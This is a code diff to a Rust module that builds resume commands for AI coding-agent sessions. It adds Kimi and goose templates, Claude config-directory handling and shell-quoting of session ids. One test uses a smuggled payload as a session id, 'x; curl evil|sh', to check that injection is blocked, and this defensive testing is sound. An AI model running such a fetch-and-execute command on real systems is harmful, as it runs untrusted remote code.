@@ -3,8 +3,8 @@
 //! A resume command is a shell template configured per source (for example
 //! `claude_resume_cmd`) or derived from built-in defaults when the agent
 //! binary is on PATH. Templates expand `{session_id}`, `{project}`,
-//! `{source}`, `{source_path}`, `{source_dir}`, `{cwd}`, and the
-//! shell-quoted `*_shell` variants.
+//! `{source}`, `{source_path}`, `{source_dir}`, `{cwd}`, the shell-quoted
+//! `*_shell` variants, and `{claude_env}`.
 
 use crate::config::UserConfig;
 use crate::types::SourceKind;
@@ -17,19 +17,22 @@ pub struct ResumeSession<'a> {
     pub project: &'a str,
     pub source_path: &'a str,
     pub source_dir: &'a str,
+    /// For `{claude_env}`: the local session's Claude config directory, including its defaults.
+    /// Remote sessions leave this unset so the remote environment selects its own directory.
+    pub claude_config_dir: Option<PathBuf>,
 }
 
 /// True for directories inside a supported source's transcript store. A resume
 /// command must never `cd` into one: CLIs such as antigravity would ask the
 /// user to trust an agent's own state store as a project workspace.
-pub fn is_state_store_dir(dir: &str) -> bool {
-    crate::sources::is_state_store_dir(Path::new(dir))
+pub fn is_state_store_dir(dir: &str, claude_sources: &[PathBuf]) -> bool {
+    crate::sources::is_state_store_dir(Path::new(dir), claude_sources)
 }
 
 /// Last-resort cwd for a resume command: the transcript's own directory when
 /// it could plausibly be a workspace, otherwise the user's home directory.
-pub fn fallback_resume_cwd(source_dir: &str) -> String {
-    if !source_dir.is_empty() && !is_state_store_dir(source_dir) {
+pub fn fallback_resume_cwd(source_dir: &str, claude_sources: &[PathBuf]) -> String {
+    if !source_dir.is_empty() && !is_state_store_dir(source_dir, claude_sources) {
         source_dir.to_string()
     } else {
         crate::sources::common::home()
@@ -40,9 +43,9 @@ pub fn fallback_resume_cwd(source_dir: &str) -> String {
 
 /// Select a resume directory using the environment of the machine that owns
 /// the session. Remote callers must use its result without applying local roots.
-pub fn resume_cwd(cwd: Option<String>, source_dir: &str) -> String {
-    cwd.filter(|dir| !dir.is_empty() && !is_state_store_dir(dir))
-        .unwrap_or_else(|| fallback_resume_cwd(source_dir))
+pub fn resume_cwd(cwd: Option<String>, source_dir: &str, claude_sources: &[PathBuf]) -> String {
+    cwd.filter(|dir| !dir.is_empty() && !is_state_store_dir(dir, claude_sources))
+        .unwrap_or_else(|| fallback_resume_cwd(source_dir, claude_sources))
 }
 
 /// The configured template for a source, falling back to built-in defaults.
@@ -68,6 +71,10 @@ pub fn resume_template(config: &UserConfig, source: SourceKind, remote: bool) ->
         SourceKind::Kiro => None,
         // KiloCode sessions resume with `kilo --session <id>` in a project directory.
         SourceKind::Kilocode => config.kilocode_resume_cmd.clone(),
+        // Kimi Code sessions resume with `kimi --session <id>` in a project directory.
+        SourceKind::Kimi => config.kimi_resume_cmd.clone(),
+        // goose sessions resume with `goose session --resume --session-id <id>`.
+        SourceKind::Goose => config.goose_resume_cmd.clone(),
     };
     configured.or_else(|| default_resume_template(source.label(), remote))
 }
@@ -75,7 +82,7 @@ pub fn resume_template(config: &UserConfig, source: SourceKind, remote: bool) ->
 pub fn default_resume_template(cmd: &str, remote: bool) -> Option<String> {
     match cmd {
         "claude" if remote || find_in_path("claude").is_some() => {
-            Some("cd {cwd_shell} && claude --resume {session_id}".to_string())
+            Some("cd {cwd_shell} && {claude_env}claude --resume {session_id}".to_string())
         }
         "codex" if remote || find_in_path("codex").is_some() => {
             Some("codex resume {session_id}".to_string())
@@ -115,13 +122,26 @@ pub fn default_resume_template(cmd: &str, remote: bool) -> Option<String> {
         "kilocode" if remote || find_in_path("kilo").is_some() => {
             Some("cd {cwd_shell} && kilo --session {session_id}".to_string())
         }
+        "kimi" if remote || find_in_path("kimi").is_some() => {
+            Some("cd {cwd_shell} && kimi --session {session_id}".to_string())
+        }
+        "goose" if remote || find_in_path("goose").is_some() => {
+            Some("cd {cwd_shell} && goose session --resume --session-id {session_id}".to_string())
+        }
         _ => None,
     }
 }
 
 pub fn expand_resume_template(template: &str, session: &ResumeSession, cwd: &str) -> String {
+    let session_id = match session.source {
+        SourceKind::Kimi => crate::sources::kimi::resume_session_id(session.session_id),
+        _ => session.session_id,
+    };
+    // Session ids come from transcript content and every default template runs
+    // `{session_id}` through a shell, so an id that is not a plain word is quoted.
+    // It is expanded last so placeholders inside the id are never expanded.
     template
-        .replace("{session_id}", session.session_id)
+        .replace("{claude_env}", &claude_env(session))
         .replace("{project}", session.project)
         .replace("{source}", session.source.label())
         .replace("{source_path_shell}", &shell_quote(session.source_path))
@@ -130,6 +150,58 @@ pub fn expand_resume_template(template: &str, session: &ResumeSession, cwd: &str
         .replace("{source_dir}", session.source_dir)
         .replace("{cwd_shell}", &shell_quote(cwd))
         .replace("{cwd}", cwd)
+        .replace("{session_id}", &shell_word(session_id))
+}
+
+/// `value` unchanged when the shell reads it as one literal word, otherwise quoted.
+fn shell_word(value: &str) -> std::borrow::Cow<'_, str> {
+    let plain = !value.is_empty()
+        && value
+            .chars()
+            .all(|ch| ch.is_ascii_alphanumeric() || "-_.:@+=,/".contains(ch));
+    if plain {
+        std::borrow::Cow::Borrowed(value)
+    } else {
+        std::borrow::Cow::Owned(shell_quote(value))
+    }
+}
+
+/// The config directory a local Claude session resumes in: the parent of the configured
+/// `projects` root that holds its transcript. Default directories are returned too so resume
+/// can clear a conflicting inherited `CLAUDE_CONFIG_DIR` without relocating `.claude.json`.
+/// Roots that are not a config directory's `projects` name no config directory.
+pub fn claude_config_dir(
+    source: SourceKind,
+    source_path: &str,
+    claude_sources: &[PathBuf],
+) -> Option<PathBuf> {
+    if source != SourceKind::Claude {
+        return None;
+    }
+    let path = Path::new(source_path);
+    let config_dir = claude_sources
+        .iter()
+        .filter(|root| root.file_name().is_some_and(|name| name == "projects"))
+        .find(|root| path.starts_with(root))?
+        .parent()?;
+    Some(config_dir.to_path_buf())
+}
+
+/// Select a local session's config directory. Default directories use an unset variable,
+/// preserving Claude's default `.claude.json` location; remote and unknown roots inherit it.
+fn claude_env(session: &ResumeSession) -> String {
+    session
+        .claude_config_dir
+        .as_ref()
+        .map(|dir| {
+            let home = crate::sources::common::home();
+            if *dir == home.join(".claude") || *dir == home.join(".config/claude") {
+                "env -u CLAUDE_CONFIG_DIR ".to_string()
+            } else {
+                format!("CLAUDE_CONFIG_DIR={} ", shell_quote(&dir.to_string_lossy()))
+            }
+        })
+        .unwrap_or_default()
 }
 
 pub fn shell_quote(value: &str) -> String {
@@ -171,6 +243,7 @@ mod tests {
             project: "memex",
             source_path: "/logs/it's.jsonl",
             source_dir: "/logs",
+            claude_config_dir: None,
         }
     }
 
@@ -182,6 +255,82 @@ mod tests {
             "/work",
         );
         assert_eq!(out, "claude abc-123 memex /logs/it's.jsonl /logs /work");
+    }
+
+    #[test]
+    fn session_ids_from_transcripts_cannot_inject_shell_syntax() {
+        let session = ResumeSession {
+            session_id: "x; curl evil|sh {cwd}",
+            ..session()
+        };
+        let template = default_resume_template("codex", true).unwrap();
+        assert_eq!(
+            expand_resume_template(&template, &session, "/work"),
+            "codex resume 'x; curl evil|sh {cwd}'"
+        );
+    }
+
+    #[test]
+    fn claude_sessions_from_a_configured_profile_resume_there() {
+        let _guard = crate::test_support::env_lock();
+        let _env = crate::test_support::EnvVarGuard::set(&[
+            ("HOME", Some("/home/u")),
+            ("CLAUDE_CONFIG_DIR", Some("/home/u/.claude-profiles/other")),
+        ]);
+        let roots = [
+            PathBuf::from("/home/u/.claude/projects"),
+            PathBuf::from("/home/u/.claude-profiles/work/projects"),
+            PathBuf::from("/data/claude-archive"),
+        ];
+        let config_dir = |source, path| claude_config_dir(source, path, &roots);
+        assert_eq!(
+            config_dir(
+                SourceKind::Claude,
+                "/home/u/.claude-profiles/work/projects/-repo/abc.jsonl"
+            ),
+            Some(PathBuf::from("/home/u/.claude-profiles/work"))
+        );
+        // The default directory must clear a conflicting inherited variable.
+        assert_eq!(
+            config_dir(
+                SourceKind::Claude,
+                "/home/u/.claude/projects/-repo/abc.jsonl"
+            ),
+            Some(PathBuf::from("/home/u/.claude"))
+        );
+        // A root that is not a config directory's `projects` names no config directory.
+        assert_eq!(
+            config_dir(SourceKind::Claude, "/data/claude-archive/-repo/abc.jsonl"),
+            None
+        );
+        assert_eq!(
+            config_dir(
+                SourceKind::Codex,
+                "/home/u/.claude-profiles/work/projects/-repo/abc.jsonl"
+            ),
+            None
+        );
+
+        let template = default_resume_template("claude", true).unwrap();
+        let resume = |claude_config_dir| {
+            expand_resume_template(
+                &template,
+                &ResumeSession {
+                    source: SourceKind::Claude,
+                    session_id: "abc",
+                    project: "memex",
+                    source_path: "/unused",
+                    source_dir: "/unused",
+                    claude_config_dir,
+                },
+                "/repo",
+            )
+        };
+        assert_eq!(
+            resume(Some(PathBuf::from("/home/u/.claude-profiles/work"))),
+            "cd '/repo' && CLAUDE_CONFIG_DIR='/home/u/.claude-profiles/work' claude --resume abc"
+        );
+        assert_eq!(resume(None), "cd '/repo' && claude --resume abc");
     }
 
     #[test]
@@ -210,13 +359,18 @@ mod tests {
             .to_string_lossy()
             .into_owned();
         let workspace = temp.path().join("my-repo").to_string_lossy().into_owned();
-        assert!(is_state_store_dir(&brain_logs));
-        assert!(!is_state_store_dir(&workspace));
+        assert!(is_state_store_dir(&brain_logs, &[]));
+        assert!(!is_state_store_dir(&workspace, &[]));
         // A plausible transcript directory is kept as the last resort; agent
         // state stores (and empty paths) fall back to the user's home.
-        assert_eq!(fallback_resume_cwd(&workspace), workspace);
-        assert_eq!(fallback_resume_cwd(&brain_logs), home);
-        assert_eq!(fallback_resume_cwd(""), home);
+        assert_eq!(fallback_resume_cwd(&workspace, &[]), workspace);
+        assert_eq!(fallback_resume_cwd(&brain_logs, &[]), home);
+        assert_eq!(fallback_resume_cwd("", &[]), home);
+        // Configured Claude roots are state stores too.
+        assert_eq!(
+            fallback_resume_cwd(&workspace, &[temp.path().join("my-repo")]),
+            home
+        );
     }
 
     #[test]
@@ -233,6 +387,25 @@ mod tests {
             default_resume_template("opencode", true).as_deref(),
             Some("opencode --session {session_id}")
         );
+    }
+
+    #[test]
+    fn kimi_subagent_resumes_its_owning_session() {
+        let template = default_resume_template("kimi", true).unwrap();
+        let session = |session_id| ResumeSession {
+            source: SourceKind::Kimi,
+            session_id,
+            project: "repo",
+            source_path: "/k/sessions/wd/session_a/agents/agent-0/wire.jsonl",
+            source_dir: "/k/sessions/wd/session_a/agents/agent-0",
+            claude_config_dir: None,
+        };
+        for session_id in ["session_a", "session_a:agent-0"] {
+            assert_eq!(
+                expand_resume_template(&template, &session(session_id), "/repo"),
+                "cd '/repo' && kimi --session session_a"
+            );
+        }
     }
 
     #[test]
